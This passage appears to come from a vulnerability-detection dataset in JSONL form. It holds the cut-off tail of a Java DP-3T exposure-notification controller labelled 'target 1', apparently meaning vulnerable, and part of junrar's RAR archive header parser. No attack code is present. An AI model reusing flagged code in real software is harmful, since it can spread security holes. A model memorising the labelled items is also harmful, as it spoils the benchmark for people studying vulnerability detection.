instanceof Jwt) {\n\t\t\tvar originalJWT = (Jwt) principal;\n\t\t\tvar jwtBuilder = Jwts.builder().setId(UUID.randomUUID().toString()).setIssuedAt(Date.from(Instant.now()))\n\t\t\t\t\t.setIssuer(\"dpppt-sdk-backend\").setSubject(originalJWT.getSubject())\n\t\t\t\t\t.setExpiration(Date\n\t\t\t\t\t\t\t.from(delayedKeyDate.atStartOfDay().toInstant(ZoneOffset.UTC).plus(Duration.ofHours(48))))\n\t\t\t\t\t.claim(\"scope\", \"currentDayExposed\").claim(\"delayedKeyDate\", gaenRequest.getDelayedKeyDate());\n\t\t\tif (originalJWT.containsClaim(\"fake\")) {\n\t\t\t\tjwtBuilder.claim(\"fake\", originalJWT.getClaim(\"fake\"));\n\t\t\t}\n\t\t\tString jwt = jwtBuilder.signWith(secondDayKey).compact();\n\t\t\tresponseBuilder.header(\"Authorization\", \"Bearer \" + jwt);\n\t\t\tresponseBuilder.header(\"X-Exposed-Token\", \"Bearer \" + jwt);\n\t\t}\n\t\tCallable<ResponseEntity<String>> cb = () -> {\n\t\t\tnormalizeRequestTime(now);\n\t\t\treturn responseBuilder.body(\"OK\");\n\t\t};\n\t\treturn cb;\n\t}\n\n\t@PostMapping(value = \"/exposednextday\")\n\t@Loggable\n\t@Transactional\n\t@Operation(description = \"Allows the client to send the last exposed key of the infection to the backend server. The JWT must come from a previous call to /exposed\")\n\t@ApiResponses(value = {\n\t\t\t@ApiResponse(responseCode = \"200\", description = \"The exposed key has been stored in the backend\"),\n\t\t\t@ApiResponse(responseCode = \"400\", description = \n\t\t\t\t\t\"- Ivnalid base64 encoded Temporary Exposure Key\" +\n\t\t\t\t\t\"- TEK-date does not match delayedKeyDAte claim in Jwt\" +\n\t\t\t\t\t\"- TEK has negative rolling period\"),\n\t\t\t@ApiResponse(responseCode = \"403\", description = \"No delayedKeyDate claim in authentication\") })\n\tpublic @ResponseBody Callable<ResponseEntity<String>> addExposedSecond(\n\t\t\t@Valid @RequestBody @Parameter(description = \"The last exposed key of the user\") GaenSecondDay gaenSecondDay,\n\t\t\t@RequestHeader(value = \"User-Agent\") @Parameter(description = \"App Identifier (PackageName/BundleIdentifier) + App-Version + OS (Android/iOS) + OS-Version\", example = \"ch.ubique.android.starsdk;1.0;iOS;13.3\") String userAgent,\n\t\t\t@AuthenticationPrincipal @Parameter(description = \"JWT token that can be verified by the backend server, must have been created by /v1/gaen/exposed and contain the delayedKeyDate\") Object principal) {\n\t\tvar now = Instant.now().toEpochMilli();\n\n\t\tif (!validationUtils.isValidBase64Key(gaenSecondDay.getDelayedKey().getKeyData())) {\n\t\t\treturn () -> new ResponseEntity<>(\"No valid base64 key\", HttpStatus.BAD_REQUEST);\n\t\t}\n\t\tif (principal instanceof Jwt && !((Jwt) principal).containsClaim(\"delayedKeyDate\")) {\n\t\t\treturn () -> ResponseEntity.status(HttpStatus.FORBIDDEN).body(\"claim does not contain delayedKeyDate\");\n\t\t}\n\t\tif (principal instanceof Jwt) {\n\t\t\tvar jwt = (Jwt) principal;\n\t\t\tvar claimKeyDate = Integer.parseInt(jwt.getClaimAsString(\"delayedKeyDate\"));\n\t\t\tif (!gaenSecondDay.getDelayedKey().getRollingStartNumber().equals(claimKeyDate)) {\n\t\t\t\treturn () -> ResponseEntity.badRequest().body(\"keyDate does not match claim keyDate\");\n\t\t\t}\n\t\t}\n\n\t\tif (!this.validateRequest.isFakeRequest(principal, gaenSecondDay.getDelayedKey())) {\n\t\t\tif (gaenSecondDay.getDelayedKey().getRollingPeriod().equals(0)) {\n\t\t\t\t// currently only android seems to send 0 which can never be valid, since a non used key should not be submitted\n\t\t\t\t// default value according to EN is 144, so just set it to that. If we ever get 0 from iOS we should log it, since\n\t\t\t\t// this should not happen\n\t\t\t\tgaenSecondDay.getDelayedKey().setRollingPeriod(GaenKey.GaenKeyDefaultRollingPeriod);\n\t\t\t\tif(userAgent.toLowerCase().contains(\"ios\")) {\n\t\t\t\t\tlogger.error(\"Received a rolling period of 0 for an iOS User-Agent\");\n\t\t\t\t}\n\t\t\t} else if(gaenSecondDay.getDelayedKey().getRollingPeriod() < 0) {\n\t\t\t\treturn () -> ResponseEntity.status(HttpStatus.BAD_REQUEST).body(\"Rolling Period MUST NOT be negative.\");\n\t\t\t}\n\t\t\tList<GaenKey> keys = new ArrayList<>();\n\t\t\tkeys.add(gaenSecondDay.getDelayedKey());\n\t\t\tdataService.upsertExposees(keys);\n\t\t}\n\n\t\treturn () -> {\n\t\t\tnormalizeRequestTime(now);\n\t\t\treturn ResponseEntity.ok().body(\"OK\");\n\t\t};\n\n\t}\n\n\t@GetMapping(value = \"/exposed/{keyDate}\", produces = \"application/zip\")\n\t@Loggable\n\t@Operation(description = \"Request the exposed key from a given date\")\n\t@ApiResponses(value = {\n\t\t\t@ApiResponse(responseCode = \"200\", description = \"zipped export.bin and export.sig of all keys in that interval\"),\n\t\t\t@ApiResponse(responseCode = \"400\", description = \n\t\t\t\t\t\"- invalid starting key date, doesn't point to midnight UTC\" +\n\t\t\t\t\t\"- _publishedAfter_ is not at the beginning of a batch release time, currently 2h\")})\n\tpublic @ResponseBody ResponseEntity<byte[]> getExposedKeys(\n\t\t\t@PathVariable @Parameter(description = \"Requested date for Exposed Keys retrieval, in milliseconds since Unix epoch (1970-01-01). It must indicate the beginning of a TEKRollingPeriod, currently midnight UTC.\", example = \"1593043200000\") long keyDate,\n\t\t\t@RequestParam(required = false) @Parameter(description = \"Restrict returned Exposed Keys to dates after this parameter. Given in milliseconds since Unix epoch (1970-01-01).\", example = \"1593043200000\") Long publishedafter)\n\t\t\tthrows BadBatchReleaseTimeException, IOException, InvalidKeyException, SignatureException,\n\t\t\tNoSuchAlgorithmException {\n\t\tif (!validationUtils.isValidKeyDate(keyDate)) {\n\t\t\treturn ResponseEntity.notFound().build();\n\t\t}\n\t\tif (publishedafter != null && !validationUtils.isValidBatchReleaseTime(publishedafter)) {\n\t\t\treturn ResponseEntity.notFound().build();\n\t\t}\n\n\t\tlong now = System.currentTimeMillis();\n\t\t// calculate exposed until bucket\n\t\tlong publishedUntil = now - (now % releaseBucketDuration.toMillis());\n\t\tDateTime dateTime = new DateTime(publishedUntil + releaseBucketDuration.toMillis() - 1, DateTimeZone.UTC);\n\t\t\n\t\tvar exposedKeys = dataService.getSortedExposedForKeyDate(keyDate, publishedafter, publishedUntil);\n\t\texposedKeys = fakeKeyService.fillUpKeys(exposedKeys, publishedafter, keyDate);\n\t\tif (exposedKeys.isEmpty()) {\n\t\t\treturn ResponseEntity.noContent()//.cacheControl(CacheControl.maxAge(exposedListCacheControl))\n\t\t\t\t\t.header(\"X-PUBLISHED-UNTIL\", Long.toString(publishedUntil))\n\t\t\t\t\t.header(\"Expires\", RFC1123_DATE_TIME_FORMATTER.print(dateTime))\n\t\t\t\t\t.build();\n\t\t}\n\n\t\tProtoSignatureWrapper payload = gaenSigner.getPayload(exposedKeys);\n\t\t\n\t\treturn ResponseEntity.ok()//.cacheControl(CacheControl.maxAge(exposedListCacheControl))\n\t\t\t\t.header(\"X-PUBLISHED-UNTIL\", Long.toString(publishedUntil))\n\t\t\t\t.header(\"Expires\", RFC1123_DATE_TIME_FORMATTER.print(dateTime))\n\t\t\t\t.body(payload.getZip());\n\t}\n\n\t@GetMapping(value = \"/buckets/{dayDateStr}\")\n\t@Loggable\n\t@Operation(description = \"Request the available release batch times for a given day\")\n\t@ApiResponses(value = {\n\t\t\t@ApiResponse(responseCode = \"200\", description = \"zipped export.bin and export.sig of all keys in that interval\"),\n\t\t\t@ApiResponse(responseCode = \"400\", description = \"invalid starting key date, points outside of the retention range\")})\n\tpublic @ResponseBody ResponseEntity<DayBuckets> getBuckets(\n\t\t\t@PathVariable @Parameter(description = \"Starting date for exposed key retrieval, as ISO-8601 format\", example = \"2020-06-27\") String dayDateStr) {\n\t\tvar atStartOfDay = LocalDate.parse(dayDateStr).atStartOfDay().toInstant(ZoneOffset.UTC)\n\t\t\t\t.atOffset(ZoneOffset.UTC);\n\t\tvar end = atStartOfDay.plusDays(1);\n\t\tvar now = Instant.now().atOffset(ZoneOffset.UTC);\n\t\tif (!validationUtils.isDateInRange(atStartOfDay)) {\n\t\t\treturn ResponseEntity.notFound().build();\n\t\t}\n\t\tvar relativeUrls = new ArrayList<String>();\n\t\tvar dayBuckets = new DayBuckets();\n\n\t\tString controllerMapping = this.getClass().getAnnotation(RequestMapping.class).value()[0];\n\t\tdayBuckets.setDay(dayDateStr).setRelativeUrls(relativeUrls).setDayTimestamp(atStartOfDay.toInstant().toEpochMilli());\n\n\t\twhile (atStartOfDay.toInstant().toEpochMilli() < Math.min(now.toInstant().toEpochMilli(),\n\t\t\t\tend.toInstant().toEpochMilli())) {\n\t\t\trelativeUrls.add(controllerMapping + \"/exposed\" + \"/\" + atStartOfDay.toInstant().toEpochMilli());\n\t\t\tatStartOfDay = atStartOfDay.plus(this.releaseBucketDuration);\n\t\t}\n\n\t\treturn ResponseEntity.ok(dayBuckets);\n\t}\n\n\tprivate void normalizeRequestTime(long now) {\n\t\tlong after = Instant.now().toEpochMilli();\n\t\tlong duration = after - now;\n\t\ttry {\n\t\t\tThread.sleep(Math.max(requestTime.minusMillis(duration).toMillis(), 0));\n\t\t} catch (Exception ex) {\n\t\t\tlogger.error(\"Couldn't equalize request time: {}\", ex.toString());\n\t\t}\n\t}\n\n\tprivate boolean hasNegativeRollingPeriod(GaenKey key) {\n\t\tInteger rollingPeriod = key.getRollingPeriod();\n\t\tif (key.getRollingPeriod() < 0) {\n\t\t\tlogger.error(\"Detected key with negative rolling period {}\", rollingPeriod);\n\t\t\treturn true;\n\t\t} else {\n\t\t\treturn false;\n\t\t}\n\t}\n\n\tprivate boolean hasInvalidKeyDate(Object principal, GaenKey key) {\n\t\ttry { \n\t\t\tthis.validateRequest.getKeyDate(principal, key);\n\t\t}\n\t\tcatch (InvalidDateException invalidDate) {\n\t\t\tlogger.error(invalidDate.getLocalizedMessage());\n\t\t\treturn true;\n\t\t}\n\t\treturn false;\n\t}\n\n\t@ExceptionHandler({IllegalArgumentException.class, InvalidDateException.class, JsonProcessingException.class,\n\t\t\tMethodArgumentNotValidException.class, BadBatchReleaseTimeException.class, DateTimeParseException.class})\n\t@ResponseStatus(HttpStatus.BAD_REQUEST)\n    public ResponseEntity<Object> invalidArguments(Exception ex) {\n        logger.error(\"Exception ({}): {}\", ex.getClass().getSimpleName(), ex.getMessage(), ex);\n\t\treturn ResponseEntity.badRequest().build();\n\t}\n}", "target": 1}
{"idx": 1081, "func": "/*\n * Copyright (c) 2007 innoSysTec (R) GmbH, Germany. All rights reserved.\n * Original author: Edmund Wagner\n * Creation date: 22.05.2007\n *\n * Source: $HeadURL$\n * Last changed: $LastChangedDate$\n *\n * the unrar licence applies to all junrar source and binary distributions\n * you are not allowed to use this source to re-create the RAR compression\n * algorithm\n *\n * Here some html entities which can be used for escaping javadoc tags:\n * \"&\":  \"&#038;\" or \"&amp;\"\n * \"<\":  \"&#060;\" or \"&lt;\"\n * \">\":  \"&#062;\" or \"&gt;\"\n * \"@\":  \"&#064;\"\n */\npackage com.github.junrar;\n\nimport java.io.Closeable;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.PipedInputStream;\nimport java.io.PipedOutputStream;\nimport java.util.ArrayList;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\nimport com.github.junrar.exception.RarException;\nimport com.github.junrar.exception.RarException.RarExceptionType;\nimport com.github.junrar.impl.FileVolumeManager;\nimport com.github.junrar.io.IReadOnlyAccess;\nimport com.github.junrar.rarfile.AVHeader;\nimport com.github.junrar.rarfile.BaseBlock;\nimport com.github.junrar.rarfile.BlockHeader;\nimport com.github.junrar.rarfile.CommentHeader;\nimport com.github.junrar.rarfile.EAHeader;\nimport com.github.junrar.rarfile.EndArcHeader;\nimport com.github.junrar.rarfile.FileHeader;\nimport com.github.junrar.rarfile.MacInfoHeader;\nimport com.github.junrar.rarfile.MainHeader;\nimport com.github.junrar.rarfile.MarkHeader;\nimport com.github.junrar.rarfile.ProtectHeader;\nimport com.github.junrar.rarfile.SignHeader;\nimport com.github.junrar.rarfile.SubBlockHeader;\nimport com.github.junrar.rarfile.UnixOwnersHeader;\nimport com.github.junrar.rarfile.UnrarHeadertype;\nimport com.github.junrar.unpack.ComprDataIO;\nimport com.github.junrar.unpack.Unpack;\n\n\n/**\n * The Main Rar Class; represents a rar Archive\n * \n * @author $LastChangedBy$\n * @version $LastChangedRevision$\n */\npublic class Archive implements Closeable {\n\tprivate static Logger logger = Logger.getLogger(Archive.class.getName());\n\n\tprivate static int MAX_HEADER_SIZE = 20971520;//20MB\n\n\tprivate IReadOnlyAccess rof;\n\n\tprivate final UnrarCallback unrarCallback;\n\n\tprivate final ComprDataIO dataIO;\n\n\tprivate final List<BaseBlock> headers = new ArrayList<BaseBlock>();\n\n\tprivate MarkHeader markHead = null;\n\n\tprivate MainHeader newMhd = null;\n\n\tprivate Unpack unpack;\n\n\tprivate int currentHeaderIndex;\n\n\t/** Size of packed data in current file. */\n\tprivate long totalPackedSize = 0L;\n\n\t/** Number of bytes of compressed data read from current file. */\n\tprivate long totalPackedRead = 0L;\n\n\tprivate VolumeManager volumeManager;\n\tprivate Volume volume;\n\n\tpublic Archive(VolumeManager volumeManager) throws RarException,\n\t\t\tIOException {\n\t\tthis(volumeManager, null);\n\t}\n\n\t/**\n\t * create a new archive object using the given {@link VolumeManager}\n\t * \n\t * @param volumeManager\n\t *            the the {@link VolumeManager} that will provide volume stream\n\t *            data\n\t * @throws RarException\n\t */\n\tpublic Archive(VolumeManager volumeManager, UnrarCallback unrarCallback)\n\t\t\tthrows RarException, IOException {\n\t\tthis.volumeManager = volumeManager;\n\t\tthis.unrarCallback = unrarCallback;\n\n\t\tsetVolume(this.volumeManager.nextArchive(this, null));\n\t\tdataIO = new ComprDataIO(this);\n\t}\n\n\tpublic Archive(File firstVolume) throws RarException, IOException {\n\t\tthis(new FileVolumeManager(firstVolume), null);\n\t}\n\n\tpublic Archive(File firstVolume, UnrarCallback unrarCallback)\n\t\t\tthrows RarException, IOException {\n\t\tthis(new FileVolumeManager(firstVolume), unrarCallback);\n\t}\n\n\t// public File getFile() {\n\t// return file;\n\t// }\n\t//\n\t// void setFile(File file) throws IOException {\n\t// this.file = file;\n\t// setFile(new ReadOnlyAccessFile(file), file.length());\n\t// }\n\n\tprivate void setFile(IReadOnlyAccess file, long length) throws IOException {\n\t\ttotalPackedSize = 0L;\n\t\ttotalPackedRead = 0L;\n\t\tclose();\n\t\trof = file;\n\t\ttry {\n\t\t\treadHeaders(length);\n\t\t} catch (Exception e) {\n\t\t\tlogger.log(Level.WARNING,\n\t\t\t\t\t\"exception in archive constructor maybe file is encrypted \"\n\t\t\t\t\t\t\t+ \"or currupt\", e);\n\t\t\t// ignore exceptions to allow exraction of working files in\n\t\t\t// corrupt archive\n\t\t}\n\t\t// Calculate size of packed data\n\t\tfor (BaseBlock block : headers) {\n\t\t\tif (block.getHeaderType() == UnrarHeadertype.FileHeader) {\n\t\t\t\ttotalPackedSize += ((FileHeader) block).getFullPackSize();\n\t\t\t}\n\t\t}\n\t\tif (unrarCallback != null) {\n\t\t\tunrarCallback.volumeProgressChanged(totalPackedRead,\n\t\t\t\t\ttotalPackedSize);\n\t\t}\n\t}\n\n\tpublic void bytesReadRead(int count) {\n\t\tif (count > 0) {\n\t\t\ttotalPackedRead += count;\n\t\t\tif (unrarCallback != null) {\n\t\t\t\tunrarCallback.volumeProgressChanged(totalPackedRead,\n\t\t\t\t\t\ttotalPackedSize);\n\t\t\t}\n\t\t}\n\t}\n\n\tpublic IReadOnlyAccess getRof() {\n\t\treturn rof;\n\t}\n\n\t/**\n\t * Gets all of the headers in the archive.\n\t *\n\t * @return returns the headers.\n\t */\n\tpublic List<BaseBlock> getHeaders() {\n\t\treturn new ArrayList<BaseBlock>(headers);\n\t}\n\n\t/**\n\t * @return returns all file headers of the archive\n\t */\n\tpublic List<FileHeader> getFileHeaders() {\n\t\tList<FileHeader> list = new ArrayList<FileHeader>();\n\t\tfor (BaseBlock block : headers) {\n\t\t\tif (block.getHeaderType().equals(UnrarHeadertype.FileHeader)) {\n\t\t\t\tlist.add((FileHeader) block);\n\t\t\t}\n\t\t}\n\t\treturn list;\n\t}\n\n\tpublic FileHeader nextFileHeader() {\n\t\tint n = headers.size();\n\t\twhile (currentHeaderIndex < n) {\n\t\t\tBaseBlock block = headers.get(currentHeaderIndex++);\n\t\t\tif (block.getHeaderType() == UnrarHeadertype.FileHeader) {\n\t\t\t\treturn (FileHeader) block;\n\t\t\t}\n\t\t}\n\t\treturn null;\n\t}\n\n\tpublic UnrarCallback getUnrarCallback() {\n\t\treturn unrarCallback;\n\t}\n\n\t/**\n\t * \n\t * @return whether the archive is encrypted\n\t */\n\tpublic boolean isEncrypted() {\n\t\tif (newMhd != null) {\n\t\t\treturn newMhd.isEncrypted();\n\t\t} else {\n\t\t\tthrow new NullPointerException(\"mainheader is null\");\n\t\t}\n\t}\n\n\t/**\n\t * Read the headers of the archive\n\t * \n\t * @param fileLength\n\t *            Length of file.\n\t * @throws RarException\n\t */\n\tprivate void readHeaders(long fileLength) throws IOException, RarException {\n\t\tmarkHead = null;\n\t\tnewMhd = null;\n\t\theaders.clear();\n\t\tcurrentHeaderIndex = 0;\n\t\tint toRead = 0;\n\t\t//keep track of positions already processed for\n\t\t//more robustness against corrupt files\n\t\tSet<Long> processedPositions = new HashSet<Long>();\n\t\twhile (true) {\n\t\t\tint size = 0;\n\t\t\tlong newpos = 0;\n\t\t\tbyte[] baseBlockBuffer = safelyAllocate(BaseBlock.BaseBlockSize, MAX_HEADER_SIZE);\n\n\t\t\tlong position = rof.getPosition();\n\n\t\t\t// Weird, but is trying to read beyond the end of the file\n\t\t\tif (position >= fileLength) {\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\t// logger.info(\"\\n--------reading header--------\");\n\t\t\tsize = rof.readFully(baseBlockBuffer, BaseBlock.BaseBlockSize);\n\t\t\tif (size == 0) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tBaseBlock block = new BaseBlock(baseBlockBuffer);\n\n\t\t\tblock.setPositionInFile(position);\n\n\t\t\tswitch (block.getHeaderType()) {\n\n\t\t\tcase MarkHeader:\n\t\t\t\tmarkHead = new MarkHeader(block);\n\t\t\t\tif (!markHead.isSignature()) {\n\t\t\t\t\tthrow new RarException(\n\t\t\t\t\t\t\tRarException.RarExceptionType.badRarArchive);\n\t\t\t\t}\n\t\t\t\theaders.add(markHead);\n\t\t\t\t// markHead.print();\n\t\t\t\tbreak;\n\n\t\t\tcase MainHeader:\n\t\t\t\ttoRead = block.hasEncryptVersion() ? MainHeader.mainHeaderSizeWithEnc\n\t\t\t\t\t\t: MainHeader.mainHeaderSize;\n\t\t\t\tbyte[] mainbuff = safelyAllocate(toRead, MAX_HEADER_SIZE);\n\t\t\t\trof.readFully(mainbuff, toRead);\n\t\t\t\tMainHeader mainhead = new MainHeader(block, mainbuff);\n\t\t\t\theaders.add(mainhead);\n\t\t\t\tthis.newMhd = mainhead;\n\t\t\t\tif (newMhd.isEncrypted()) {\n\t\t\t\t\tthrow new RarException(\n\t\t\t\t\t\t\tRarExceptionType.rarEncryptedException);\n\t\t\t\t}\n\t\t\t\t// mainhead.print();\n\t\t\t\tbreak;\n\n\t\t\tcase SignHeader:\n\t\t\t\ttoRead = SignHeader.signHeaderSize;\n\t\t\t\tbyte[] signBuff = safelyAllocate(toRead, MAX_HEADER_SIZE);\n\t\t\t\trof.readFully(signBuff, toRead);\n\t\t\t\tSignHeader signHead = new SignHeader(block, signBuff);\n\t\t\t\theaders.add(signHead);\n\t\t\t\t// logger.info(\"HeaderType: SignHeader\");\n\n\t\t\t\tbreak;\n\n\t\t\tcase AvHeader:\n\t\t\t\ttoRead = AVHeader.avHeaderSize;\n\t\t\t\tbyte[] avBuff = safelyAllocate(toRead, MAX_HEADER_SIZE);\n\t\t\t\trof.readFully(avBuff, toRead);\n\t\t\t\tAVHeader avHead = new AVHeader(block, avBuff);\n\t\t\t\theaders.add(avHead);\n\t\t\t\t// logger.info(\"headertype: AVHeader\");\n\t\t\t\tbreak;\n\n\t\t\tcase CommHeader:\n\t\t\t\ttoRead = CommentHeader.commentHeaderSize;\n\t\t\t\tbyte[] commBuff = safelyAllocate(toRead, MAX_HEADER_SIZE);\n\t\t\t\trof.readFully(commBuff, toRead);\n\t\t\t\tCommentHeader commHead = new CommentHeader(block, commBuff);\n\t\t\t\theaders.add(commHead);\n\t\t\t\t// logger.info(\"method: \"+commHead.getUnpMethod()+\"; 0x\"+\n\t\t\t\t// Integer.toHexString(commHead.getUnpMethod()));\n\t\t\t\tnewpos = commHead.getPositionInFile()\n\t\t\t\t\t\t+ commHead.getHeaderSize();\n\t\t\t\tif (processedPositions.contains(newpos)) {\n\t\t\t\t\tthrow new RarException(RarExceptionType.badRarArchive);\n\t\t\t\t}\n\t\t\t\tprocessedPositions.add(newpos);\n\t\t\t\trof.setPosition(newpos);\n\n\t\t\t\tbreak;\n\t\t\tcase EndArcHeader:\n\n\t\t\t\ttoRead = 0;\n\t\t\t\tif (block.hasArchiveDataCRC()) {\n\t\t\t\t\ttoRead += EndArcHeader.endArcArchiveDataCrcSize;\n\t\t\t\t}\n\t\t\t\tif (block.hasVolumeNumber()) {\n\t\t\t\t\ttoRead += EndArcHeader.endArcVolumeNumberSize;\n\t\t\t\t}\n\t\t\t\tEndArcHeader endArcHead;\n\t\t\t\tif (toRead > 0) {\n\t\t\t\t\tbyte[] endArchBuff = safelyAllocate(toRead, MAX_HEADER_SIZE);\n\t\t\t\t\trof.readFully(endArchBuff, toRead);\n\t\t\t\t\tendArcHead = new EndArcHeader(block, endArchBuff);\n\t\t\t\t\t// logger.info(\"HeaderType: endarch\\ndatacrc:\"+\n\t\t\t\t\t// endArcHead.getArchiveDataCRC());\n\t\t\t\t} else {\n\t\t\t\t\t// logger.info(\"HeaderType: endarch - no Data\");\n\t\t\t\t\tendArcHead = new EndArcHeader(block, null);\n\t\t\t\t}\n\t\t\t\theaders.add(endArcHead);\n\t\t\t\t// logger.info(\"\\n--------end header--------\");\n\t\t\t\treturn;\n\n\t\t\tdefault:\n\t\t\t\tbyte[] blockHeaderBuffer = safelyAllocate(BlockHeader.blockHeaderSize, MAX_HEADER_SIZE);\n\t\t\t\trof.readFully(blockHeaderBuffer, BlockHeader.blockHeaderSize);\n\t\t\t\tBlockHeader blockHead = new BlockHeader(block,\n\t\t\t\t\t\tblockHeaderBuffer);\n\n\t\t\t\tswitch (blockHead.getHeaderType()) {\n\t\t\t\tcase NewSubHeader:\n\t\t\t\tcase FileHeader:\n\t\t\t\t\ttoRead = blockHead.getHeaderSize()\n\t\t\t\t\t\t\t- BlockHeader.BaseBlockSize\n\t\t\t\t\t\t\t- BlockHeader.blockHeaderSize;\n\t\t\t\t\tbyte[] fileHeaderBuffer = safelyAllocate(toRead, MAX_HEADER_SIZE);\n\t\t\t\t\trof.readFully(fileHeaderBuffer, toRead);\n\n\t\t\t\t\tFileHeader fh = new FileHeader(blockHead, fileHeaderBuffer);\n\t\t\t\t\theaders.add(fh);\n\t\t\t\t\tnewpos = fh.getPositionInFile() + fh.getHeaderSize()\n\t\t\t\t\t\t\t+ fh.getFullPackSize();\n\t\t\t\t\tif (processedPositions.contains(newpos)) {\n\t\t\t\t\t\tthrow new RarException(RarExceptionType.badRarArchive);\n\t\t\t\t\t}\n\t\t\t\t\tprocessedPositions.add(newpos);\n\t\t\t\t\trof.setPosition(newpos);\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase ProtectHeader:\n\t\t\t\t\ttoRead = blockHead.getHeaderSize()\n\t\t\t\t\t\t\t- BlockHeader.BaseBlockSize\n\t\t\t\t\t\t\t- BlockHeader.blockHeaderSize;\n\t\t\t\t\tbyte[] protectHeaderBuffer = safelyAllocate(toRead, MAX_HEADER_SIZE);\n\t\t\t\t\trof.readFully(protectHeaderBuffer, toRead);\n\t\t\t\t\tProtectHeader ph = new ProtectHeader(blockHead,\n\t\t\t\t\t\t\tprotectHeaderBuffer);\n\t\t\t\t\tnewpos = ph.getPositionInFile() + ph.getHeaderSize()\n\t\t\t\t\t\t\t+ ph.getDataSize();\n\t\t\t\t\tif (processedPositions.contains(newpos)) {\n\t\t\t\t\t\tthrow new RarException(RarExceptionType.badRarArchive);\n\t\t\t\t\t}\n\t\t\t\t\tprocessedPositions.add(newpos);\n\t\t\t\t\trof.setPosition(newpos);\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase SubHeader: {\n\t\t\t\t\tbyte[] subHeadbuffer = safelyAllocate(SubBlockHeader.SubBlockHeaderSize, MAX_HEADER_SIZE);\n\t\t\t\t\trof.readFully(subHeadbuffer,\n\t\t\t\t\t\t\tSubBlockHeader.SubBlockHeaderSize);\n\t\t\t\t\tSubBlockHeader subHead = new SubBlockHeader(blockHead,\n\t\t\t\t\t\t\tsubHeadbuffer);\n\t\t\t\t\tsubHead.print();\n\t\t\t\t\tswitch (subHead.getSubType()) {\n\t\t\t\t\tcase MAC_HEAD: {\n\t\t\t\t\t\tbyte[] macHeaderbuffer = safelyAllocate(MacInfoHeader.MacInfoHeaderSize, MAX_HEADER_SIZE);\n\t\t\t\t\t\trof.readFully(macHeaderbuffer,\n\t\t\t\t\t\t\t\tMacInfoHeader.MacInfoHeaderSize);\n\t\t\t\t\t\tMacInfoHeader macHeader = new MacInfoHeader(subHead,\n\t\t\t\t\t\t\t\tmacHeaderbuffer);\n\t\t\t\t\t\tmacHeader.print();\n\t\t\t\t\t\theaders.add(macHeader);\n\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\t// TODO implement other subheaders\n\t\t\t\t\tcase BEEA_HEAD:\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase EA_HEAD: {\n\t\t\t\t\t\tbyte[] eaHeaderBuffer = safelyAllocate(EAHeader.EAHeaderSize, MAX_HEADER_SIZE);\n\t\t\t\t\t\trof.readFully(eaHeaderBuffer, EAHeader.EAHeaderSize);\n\t\t\t\t\t\tEAHeader eaHeader = new EAHeader(subHead,\n\t\t\t\t\t\t\t\teaHeaderBuffer);\n\t\t\t\t\t\teaHeader.print();\n\t\t\t\t\t\theaders.add(eaHeader);\n\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tcase NTACL_HEAD:\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase STREAM_HEAD:\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase UO_HEAD:\n\t\t\t\t\t\ttoRead = subHead.getHeaderSize();\n\t\t\t\t\t\ttoRead -= BaseBlock.BaseBlockSize;\n\t\t\t\t\t\ttoRead -= BlockHeader.blockHeaderSize;\n\t\t\t\t\t\ttoRead -= SubBlockHeader.SubBlockHeaderSize;\n\t\t\t\t\t\tbyte[] uoHeaderBuffer = safelyAllocate(toRead, MAX_HEADER_SIZE);\n\t\t\t\t\t\trof.readFully(uoHeaderBuffer, toRead);\n\t\t\t\t\t\tUnixOwnersHeader uoHeader = new UnixOwnersHeader(\n\t\t\t\t\t\t\t\tsubHead, uoHeaderBuffer);\n\t\t\t\t\t\tuoHeader.print();\n\t\t\t\t\t\theaders.add(uoHeader);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tdefault:\n\t\t\t\t\tlogger.warning(\"Unknown Header\");\n\t\t\t\t\tthrow new RarException(RarExceptionType.notRarArchive);\n\n\t\t\t\t}\n\t\t\t}\n\t\t\t// logger.info(\"\\n--------end header--------\");\n\t\t}\n\t}\n\n\tprivate static byte[] safelyAllocate(long len, int maxSize) throws RarException {\n\t\tif (maxSize < 0) {\n\t\t\tthrow new IllegalArgumentException(\"maxsize must be >= 0\");\n\t\t}\n\t\tif (len < 0 || len > (long)maxSize) {\n\t\t\tthrow new RarException(RarExceptionType.badRarArchive);\n\t\t}\n\t\treturn new byte[(int)len];\n\t}\n\n\t/**\n\t * Extract the file specified by the given header and write it to the\n\t * supplied output stream\n\t * \n\t * @param hd\n\t *            the header to be extracted\n\t * @param os\n\t *            the outputstream\n\t * @throws RarException\n\t */\n\tpublic void extractFile(FileHeader hd, OutputStream os) throws RarException {\n\t\tif (!headers.contains(hd)) {\n\t\t\tthrow new RarException(RarExceptionType.headerNotInArchive);\n\t\t}\n\t\ttry {\n\t\t\tdoExtractFile(hd, os);\n\t\t} catch (Exception e) {\n\t\t\tif (e instanceof RarException) {\n\t\t\t\tthrow (RarException) e;\n\t\t\t} else {\n\t\t\t\tthrow new RarException(e);\n\t\t\t}\n\t\t}\n\t}\n\n\t/**\n\t * Returns an {@link InputStream} that will allow to read the file and\n\t * stream it. Please note that this method will create a new Thread and an a\n\t * pair of Pipe streams.\n\t * \n\t * @param hd\n\t *            the header to be extracted\n\t * @throws RarException\n\t * @throws IOException\n\t *             if any IO error occur\n\t */\n\tpublic InputStream getInputStream(final FileHeader hd) throws RarException,\n\t\t\tIOException {\n\t\tfinal PipedInputStream in = new PipedInputStream(32 * 1024);\n\t\tfinal PipedOutputStream out = new PipedOutputStream(in);\n\n\t\t// creates a new thread that will write data to the pipe. Data will be\n\t\t// available in another InputStream, connected to the OutputStream.\n\t\tnew Thread(new Runnable() {\n\t\t\tpublic void run() {\n\t\t\t\ttry {\n\t\t\t\t\textractFile(hd, out);\n\t\t\t\t} catch (RarException e) 